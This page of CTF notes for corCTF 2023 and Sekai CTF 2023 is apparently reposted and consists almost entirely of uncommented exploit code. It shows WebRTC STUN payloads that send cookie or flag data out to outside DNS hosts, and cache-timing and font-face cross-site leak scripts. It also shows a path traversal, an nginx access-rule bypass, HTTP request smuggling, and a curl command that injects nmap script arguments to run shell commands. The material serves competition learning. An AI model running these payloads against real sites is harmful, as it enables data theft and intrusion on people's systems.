# corCTF 2023 & Sekai CTF 2023 筆記

> 原文: https://www.ctfiot.com/133112.html
> ID: 133112


```
{
 flag0:
flag(pin:0),
 flag1:
flag(pin:1),
 flag2:
flag(pin:2),
 flag3:
flag(pin:3),
 flag4:
flag(pin:4),
 flag5:
flag(pin:5)
}
@app.route('/anonymized/')
def serve_image(image_file):
 file_path = os.path.join(UPLOAD_FOLDER, unquote(image_file))
 if ".." in file_path or not os.path.exists(file_path):
 return f"Image {file_path} cannot be found.", 404
 return send_file(file_path, mimetype='image/png')
>>> os.path.join('/tmp/abc', 'test.txt')
'/tmp/abc/test.txt'
>>> os.path.join('/tmp/abc', '/test.txt')
'/test.txt'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
 

 <foreignObject>
 
 </foreignObject>
</svg>
<script>
async function a(){
 c={iceServers:[{urls:"stun:{{user.id}}.x.cjxol.com:
1337"}]}
 (p=new RTCPeerConnection(c)).createDataChannel("d")
 await p.setLocalDescription()
}
a();
</script>
Content-Security-Policy "script-src 'none'; object-src 'none'; frame-ancestors 'none';";
<script>
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
 async function clearCache() {
 let controller = new AbortController();
 let signal = controller.signal;
 fetch('https://leakynote.be.ax/assets/normalize.css',{
 mode: "no-cors",
 signal: signal,
 cache: 'reload'
 })
 await sleep(0)
 controller.abort();
 await sleep(100)
 }

 async function testNote(title, url) {
 // open note page
 var w = window.open(url)

 // wait 1s
 await sleep(1000)

 // clear cache and wait again
 await clearCache()
 await sleep(1500)

 // now the iframe should load, do cache probing
 const now = performance.now()
 await fetch('https://leakynote.be.ax/assets/normalize.css', {
 mode: 'no-cors',
 cache: 'force-cache'
 })
 const end = performance.now()
 fetch(`/report?title=${title}&ms=${end-now}`)
 if (end-now >= 4) {
 fetch('/maybe/' + title)
 }
 // cached(no result) => 2~3ms
 // no cache(found) => 4.8~5.8ms
 w.close()
 }

 // copy paste the following from python script
 async function main() {
 await testNote('{a','https://leakynote.be.ax/post.php?id=c9193aee91b0fc29')
await testNote('{c','https://leakynote.be.ax/post.php?id=9f2d1bd495927bc2')
await testNote('{d','https://leakynote.be.ax/post.php?id=0c6caa61575b9478')
await testNote('{e','https://leakynote.be.ax/post.php?id=071e07ec5b7fc2be')
await testNote('{f','https://leakynote.be.ax/post.php?id=71652df64d54c0e4')
await testNote('{g','https://leakynote.be.ax/post.php?id=354f3bec25e02332')
await testNote('{k','https://leakynote.be.ax/post.php?id=066aa475493e1a4c')
await testNote('{l','https://leakynote.be.ax/post.php?id=54a12f7b11098d2a')
await testNote('{o','https://leakynote.be.ax/post.php?id=621591145bcfc8e0')
await testNote('{r','https://leakynote.be.ax/post.php?id=6b44725cb5e274f0')
await testNote('{t','https://leakynote.be.ax/post.php?id=e025b26e5e7117a1')
await testNote('{y','https://leakynote.be.ax/post.php?id=f10001d89230485e')
await testNote('{z','https://leakynote.be.ax/post.php?id=a71fc5d1ff81edad')
 }

 main()
</script>
@font-face {
 font-family: a;
 src: url(/time-before),url(/search.php?query=corctf{a),url(/search.php?query=corctf{a),... /*10000 times */,url(/time-after)
}
location / {
 proxy_pass http://localhost:
7777;

 location ^~ /generate {
 allow 127.0.0.1;
 deny all;
 }

 location ^~ /rename {
 allow 127.0.0.1;
 deny all;
 }
}
POST /generate{chr(9)}HTTP/1.1/../../ HTTP/1.1
nmap -p #{port} #{hostname}
--script http-fetch -Pn --script-args http-fetch.destination={DOWNLOAD_DIR},http-fetch.url={NSE_SCRIPT}
--script={DOWNLOAD_DIR}/{LHOST}/{LPORT}/{NSE_SCRIPT}
curl http://35.231.135.130:
32190/ -F $'service=127.0.0.1:
1337\t--script\t/tmp/RackMultipart?????????????????' -F '=os.execute("cat /flag*");filename=evil'
GET /aaaaa HTTP/1.1
Host: localhost
transfer-encoding: chunked
Content-Length: 102

0

GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5 HTTP/1.1
X: GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json HTTP/1.1
Host: localhost
<?php
 header("Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';");
 header("Cross-Origin-Opener-Policy: same-origin");

 $payload = "???";
 if (isset($_GET["xss"]) && is_string($_GET["xss"]) && strlen($_GET["xss"]) <= 30) {
 $payload = $_GET["xss"];
 }

 $flag = "SEKAI{test_flag}";
 if (isset($_COOKIE["flag"]) && is_string($_COOKIE["flag"])) {
 $flag = $_COOKIE["flag"];
 }
?>
<!DOCTYPE html>
<html>
 
  --><?php echo htmlspecialchars($payload); ?>"
 >
 
</html>
var flag = document.childNodes[0].nodeValue.trim()
 .replace("SEKAI{", "").replace("}", "")
 .split("").map(c => c.charCodeAt(0)).join(".");
var p = new RTCPeerConnection({
 iceServers: [{
 urls: "stun:" + flag + ".29e6037fd1.ipv6.1433.eu.org:
1337"
 }]
});
p.createDataChannel("d");
p.setLocalDescription()
// leakless note oracle
const oracle = async (w, href) => {
 const runs = [];
 for (let i = 0; i < 8; i++) {
 const samples = [];
 for (let j = 0; j < 600; j++) {
 const b = new Uint8Array(1e6);
 const t = performance.now();
 w.frames[0].postMessage(b, "*", [b.buffer]);
 samples.push(performance.now() - t);
 delete b;
 }
 runs.push(samples.reduce((a,b)=>a+b, 0));
 w.location = href;
 await sleep(500); // rate limit
 await waitFor(w);
 }
 runs.sort((a,b) => a-b);
 return {
 median: median(runs.slice(2, -2)),
 sum: runs.slice(2, -2).reduce((a,b)=>a+b,0),
 runs
 }
}
```
